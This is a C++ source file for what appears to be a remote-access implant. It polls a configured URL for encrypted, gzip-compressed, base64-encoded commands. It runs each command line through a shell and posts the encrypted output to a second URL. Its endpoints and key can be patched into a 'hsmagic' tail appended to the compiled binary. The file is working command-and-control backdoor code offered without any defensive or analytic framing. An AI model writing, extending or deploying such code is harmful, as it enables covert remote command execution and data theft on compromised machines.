#include <string>
#include <vector>
#include <sstream>
#include <iostream>
#include <fstream>

#include <cstring>
#include <unistd.h>

#include "hs_http.h"
#include "hs_crypt.h"
#include "hs_compress.h"
#include "hs_base64.h"
#include "hs_exception.h"
#include "hs_misc.h"

#include "hs_static.h"

class hs_settings
{
public:
	std::string get_url;
	std::string post_url;
	std::string password;
	unsigned int interval = INTERVAL;

	void init(int argc, char *argv[]);
	void magic_init(const char *self);
};

void hs_settings::init(int argc, char *argv[])
{
	this->get_url = GET_URL;
	this->post_url = POST_URL;
	this->password = PASSWORD;
}

struct magic_tail
{
	char get_url[128];
	char post_url[128];
	char password[64];
	unsigned int interval;
	char magic[8];
};

void hs_settings::magic_init(const char *self)
{
	std::ifstream is(self, std::ifstream::binary);
	is.seekg(0, is.end);
	int length = is.tellg();
	length -= sizeof(magic_tail);
	is.seekg(length, is.beg);

	magic_tail mt;
	is.read(reinterpret_cast<char *>(&mt), sizeof(magic_tail));
	if (strcmp(mt.magic, "hsmagic") == 0)
	{
		this->get_url = mt.get_url;
		this->post_url = mt.post_url;
		this->password = mt.password;
		this->interval = mt.interval;
	}
}

int hs_signal = 0;

void daemonize();
int hs(hs_settings &setting);
void hs_impl(hs_settings &setting);

bool hs_check_data(std::vector<uint8_t> data);
std::string hs_parse_setting(const std::string &line, hs_settings &setting);
std::string hs_parse_command(const std::string &line);

int main(int argc, char *argv[])
{
	daemonize();

	hs_settings setting;
	setting.init(argc, argv);
	setting.magic_init(argv[0]);

	return hs(setting);
}

void daemonize()
{
	return;
}

int hs(hs_settings &setting)
{
	while (hs_signal == 0)
	{
		try
		{
			hs_impl(setting);
		}
		catch (hs_exception &e)
		{
			// logger
			std::cout << e.what() << std::endl;
		}
		sleep(setting.interval);
	}
	return 0;
}

void hs_impl(hs_settings &setting)
{
	auto hres = hs_http_get(setting.get_url);
	if (hres.status_code != 200)
		throw hs_exception("http get error.");
	if (hres.body.length() == 0) return;
	auto deflated = hs_gunzip(
			hs_decrypt(
				hs_base64_decode(reinterpret_cast<const unsigned char *>(hres.body.c_str()), hres.body.length()),
				setting.password));

	hs_check_data(deflated);

	std::string result;
	std::istringstream iss(std::string(deflated.begin(), deflated.end()));
	std::string line;
	while (std::getline(iss, line))
	{
		result += "==========\n";
		result += line;
		result += "\n";
		result += "----------\n";
		if (line.compare(0, 2, "s:") == 0)
		{
			result += hs_parse_setting(line, setting);
		}
		else
		{
			result += hs_parse_command(line);
		}
		result += "==========\n";
	}

	auto encoded_data = hs_base64_encode(
			hs_encrypt(
				hs_gzip(reinterpret_cast<const unsigned char *>(result.c_str()), result.length()),
				setting.password));
	auto post_data = std::string("data=") + url_encode(std::string(encoded_data.begin(), encoded_data.end()));
	auto pres = hs_http_post(setting.post_url, post_data, "");
	if (pres.status_code != 200)
		throw hs_exception("http post error.");
}

bool hs_check_data(std::vector<uint8_t> data)
{
	return true;
}

std::string hs_parse_setting(const std::string &line, hs_settings &setting)
{
	try
	{
		auto kv = split(line, '=');
		trim(kv.at(0));
		trim(kv.at(1));

		if (kv.at(0).compare("s:interval") == 0)
		{
			unsigned int i = std::stoi(kv.at(1));
			setting.interval = i;

			std::string ret = "set interval to ";
			ret += kv.at(1);
			ret += "\n";
			return ret;
		}
		throw std::exception();
	}
	catch (std::exception &e)
	{
		return "Not implement yet.\n";
	}
}

std::string hs_parse_command(const std::string &line)
{
	auto cmd = line + " 2>&1";
	return hs_exec(cmd);
}
